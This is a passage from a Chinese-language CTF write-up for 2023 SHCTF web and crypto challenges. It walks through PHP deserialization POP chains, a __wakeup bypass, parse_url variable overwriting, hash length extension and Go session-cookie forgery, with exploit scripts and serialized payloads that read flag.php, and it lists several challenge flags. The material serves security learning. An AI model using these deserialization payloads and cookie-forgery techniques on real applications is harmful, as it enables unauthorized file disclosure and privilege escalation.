          <a href="#wakeup的绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#wakeup的绕过" class="headerlink" title="wakeup的绕过"></a>wakeup的绕过</h3>
      <p>exp:</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> flag;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>
<p>此时针对wakeup的绕过我们只需要将前面的属性值加一即可<br><img src="/2023/10/05/2023SHCTF/18.png"><br><code>O:4:&quot;flag&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;code&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</code><br><img src="/2023/10/05/2023SHCTF/19.png"></p>

        <h2 id="WEEK2-serialize">
          <a href="#WEEK2-serialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h2>
      
        <h3 id="代码审计-1">
          <a href="#代码审计-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>])); </span><br></pre></td></tr></table></div></figure>
<p>此时针对反序列化的题目我们的第一步依旧是找链子，此时我们首先定位链尾；此时发现一个在<code>milaoshu</code>这个类中发现了<code>include</code>函数;此时我们可<br>以通过这个<code>include()</code>函数的文件包含中使用伪协议进行读取flag。那么此时我们就将这个作为链尾，这个时候观察<code>include()</code>函数的触发魔术魔法<br>是<code>toString</code>，我们知道<code>toString()</code>的触发方式是字符串的输出，那么此时我们就可以定位到<code>misca</code>类中的<code>get</code>魔术魔法中的<code>die</code>函数，此时<br>这个函数会输出字符串，接下来继续找<code>get</code>的触发条件，当访问一个不存在的属性或者无法访问的属性时会触发<code>get</code>那么此时我们就可以继续定位到<code>musca</code>类中的<code>wakeup()</code>此时他的<code>return $this-&gt;ding-&gt;dong;</code>会触发<code>get</code>;所以这一整条链子如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musca::__wakeup() -&gt; misca::__get($key) -&gt; milaoshu::__toString()</span><br></pre></td></tr></table></div></figure>

        <h3 id="反序列化之地址引用">
          <a href="#反序列化之地址引用" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化之地址引用" class="headerlink" title="反序列化之地址引用"></a>反序列化之地址引用</h3>
      <p>但是此时我们要触发<code>toString</code>却存在一个难点就是<code>die()</code>中的变量a会被提前赋值，此时便会使得我们无法触发<code>toString</code>;但是接下来我们看到了<br>一个奇怪的赋值形式<code>$this-&gt;gao=$this-&gt;fei;</code><br>接下来是我的理解：<br><img src="/2023/10/05/2023SHCTF/21.png"><br>此时的<code>$this -&gt; gao = $this -&gt; fei</code>此时对fei的赋值会影响到ago的值，那么此时我们直接令<code>$this -&gt; a = &amp;$this -&gt; gao</code>,此时调用a的地址<br>那么此时的die($this -&gt; a)就会变成die($this -&gt; fei);此时令$this -&gt; fei &#x3D; new milaoshu就可以调用<code>toString</code></p>

        <h4 id="浅拷贝">
          <a href="#浅拷贝" class="heading-link"><i class="fas fa-link"></i></a><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;okfafu&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = &amp;<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;0xfafu&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;  <span class="comment">//此时a=0xfafu</span></span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/20.png"><br>此时传递类似地址的方法传递过去，但其实两者是同步的或者是已经是一体的。<br>对<code>$this-&gt;gao=$this-&gt;fei</code>;的处理和ISCTF2022的猫和老鼠的考点是一样的，通过地址引用让$a指向<code>milaoshu()</code>，die可以起到echo的作用来触发<code>__toString</code>底下的check函数的检查匹配序列化字符串是否是对象字符串开头，可以在序列化时用array($a)绕过非法传参，参数名传入要改为<code>wanna[fl.ag</code></p>

        <h3 id="exp-2">
          <a href="#exp-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; gao = &amp;<span class="variable language_">$this</span> -&gt; a;<span class="comment">//重点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding=<span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei=<span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));<span class="comment">//array绕过数组</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="WEEK2-ez-rce">
          <a href="#WEEK2-ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-ez-rce" class="headerlink" title="[WEEK2]ez_rce"></a>[WEEK2]ez_rce</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj,arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp,i)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj,arg,num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg)-<span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp,arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp,arg[i+<span class="number">1</span>],num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme,num,bol</span>):</span><br><span class="line">    c = gett(subprocess,giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess,giveme,tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>)==<span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp,num,bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></div></figure>


        <h2 id="WEEK2-MD5的事就拜托了">
          <a href="#WEEK2-MD5的事就拜托了" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-MD5的事就拜托了" class="headerlink" title="[WEEK2]MD5的事就拜托了"></a>[WEEK2]MD5的事就拜托了</h2>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></div></figure>
<p>这个时候我们先进行代码审计，此时的<code>extract(parse_url($_POST[&#39;SHCTF&#39;]));</code>使用了<code>parse_url</code>进行解析post提交的url；并且将其结果作为<br>变量名；而此时的<code>if($$$scheme===&#39;SHCTF&#39;)</code>;$$$是PHP中的可变变量语法。它以一个或多个$符号紧跟着变量名，用于构造一个新的变量名。具体来<br>说,$$$scheme将使用$scheme的值来构造一个新变量名，然后访问这个变量。;<code>if($num*100!=intval($num*100)) </code>这个条件检查 $num 乘以 100 的结果是否与其整数值不相等。然后如果满足的话将会输出flag的长度；接下来判断以POST提交的SHCTF是否等于flag的md5值；如果等于的话会输<br>出flag</p>

        <h3 id="parse-url变量覆盖">
          <a href="#parse-url变量覆盖" class="heading-link"><i class="fas fa-link"></i></a><a href="#parse-url变量覆盖" class="headerlink" title="parse_url变量覆盖"></a>parse_url变量覆盖</h3>
      <p>此时我们先研究一下<code>parse_url</code>这个函数；此时在本地实验一下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="string">&#x27;https://www.example.com:8080/path/file.php?var1=value1&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$array</span>);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/22.png"><br>这里结合变量覆盖可得</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//这里我选用的是url的scheme，host，query这三个位置</span><br><span class="line">$scheme=host</span><br><span class="line">$$scheme=$host=query</span><br><span class="line">$$$scheme=$query=SHCTF</span><br><span class="line">payload1:</span><br><span class="line">host://query?SHCTF  //分别把值对应到url上</span><br></pre></td></tr></table></div></figure>
<p>MAD5&#x3D;8f56a8b852f6a1c71b94a9e96fa4b08a</p>

        <h3 id="intval特性">
          <a href="#intval特性" class="heading-link"><i class="fas fa-link"></i></a><a href="#intval特性" class="headerlink" title="intval特性"></a>intval特性</h3>
      <p>然后再看GET传参，直接传1.0001<br>length&#x3D;42</p>

        <h3 id="hash拓展长度攻击">
          <a href="#hash拓展长度攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#hash拓展长度攻击" class="headerlink" title="hash拓展长度攻击"></a>hash拓展长度攻击</h3>
      <p>这个时候看到<code> if($_POST[&#39;SHCTF&#39;]===md5($flag.urldecode($num)))</code>我们就可以马上想到hash拓展长度攻击<br><img src="/2023/10/05/2023SHCTF/23.png"><br><img src="/2023/10/05/2023SHCTF/24.png"></p>

        <h2 id="WEEK3-gogogo">
          <a href="#WEEK3-gogogo" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK3-gogogo" class="headerlink" title="[WEEK3]gogogo"></a>[WEEK3]gogogo</h2>
      <p>下载附件，是用go的gin框架写的后端，cookie-session是由gorilla&#x2F;sessions来实现，而sessions库使用了另一个库：gorilla&#x2F;securecookie<br>来实现对cookie的安全传输。<br>查看源码，发现主要部分在route.go部分，需要admin才有权限查看文件得到flag<br>总共有两个路由，一个“&#x2F;“路由，一个”&#x2F;readflag”路由<br>根路由</p>
<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;main/route&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    r := gin.Default()</span><br><span class="line">    r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">    r.GET(<span class="string">&quot;/readflag&quot;</span>, route.Readflag)</span><br><span class="line">    r.Run(<span class="string">&quot;0.0.0.0:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>重要代码</p>
<figure class="highlight go"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">        session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;User&quot;</span></span><br><span class="line">        err = session.Save(c.Request, c.Writer)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.String(<span class="number">200</span>, <span class="string">&quot;Hello, User. How to become admin?&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>可以看到，这里将判断是否携带了cookie，如果cookie中的name为空，就将其设置为user。并且有一个细节，无论是否是管理员，根路由永远都会返回<br><code>Hello, User. How to become admin?</code><br>想到需要伪造session;上面通过获取环境变量中的SESSION_KEY来获取生成secure cookie。只能对SESSION_KEY进行猜测，猜测并未设置SESSION_KEY。在本地运行程序，将SESSION_KEY置为空从而伪造cookie。</p>

        <h1 id="Crypto">
          <a href="#Crypto" class="heading-link"><i class="fas fa-link"></i></a><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1>
      
        <h2 id="WEEK1-Crypto-Checkin">
          <a href="#WEEK1-Crypto-Checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-Crypto-Checkin" class="headerlink" title="[WEEK1]Crypto_Checkin"></a>[WEEK1]Crypto_Checkin</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base85(b) -&gt; base64 -&gt; base32 -&gt; base16</span><br></pre></td></tr></table></div></figure>
<p>flag{Th1s_1s_B4s3_3nc0d3}</p>

        <h2 id="WEEK1-凯撒大帝">
          <a href="#WEEK1-凯撒大帝" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-凯撒大帝" class="headerlink" title="[WEEK1]凯撒大帝"></a>[WEEK1]凯撒大帝</h2>
      <p><img src="/2023/10/05/2023SHCTF/8.png"><br>flag{chutihaonan}</p>

        <h2 id="WEEK1-进制">
          <a href="#WEEK1-进制" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-进制" class="headerlink" title="[WEEK1]进制"></a>[WEEK1]进制</h2>
      <p><img src="/2023/10/05/2023SHCTF/9.png"><br>flag{ahfkjlhkah}</p>

        <h2 id="WEEK1-残缺的md5">
          <a href="#WEEK1-残缺的md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-残缺的md5" class="headerlink" title="[WEEK1]残缺的md5"></a>[WEEK1]残缺的md5</h2>
      <p>描述：苑晴在路边捡到了一张纸条，上面有一串字符串：<code>KCLWG?K8M9O3?DE?84S9</code>问号是被污染的部分，纸条的背面写着被污染的地方为大写字母，<br>还给了这串字符串的md5码值：<code>F0AF????B1F463????F7AE???B2AC4E6</code>请提交完整的md5码值并用flag{}包裹提交</p>

        <h3 id="exp-3">
          <a href="#exp-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3>
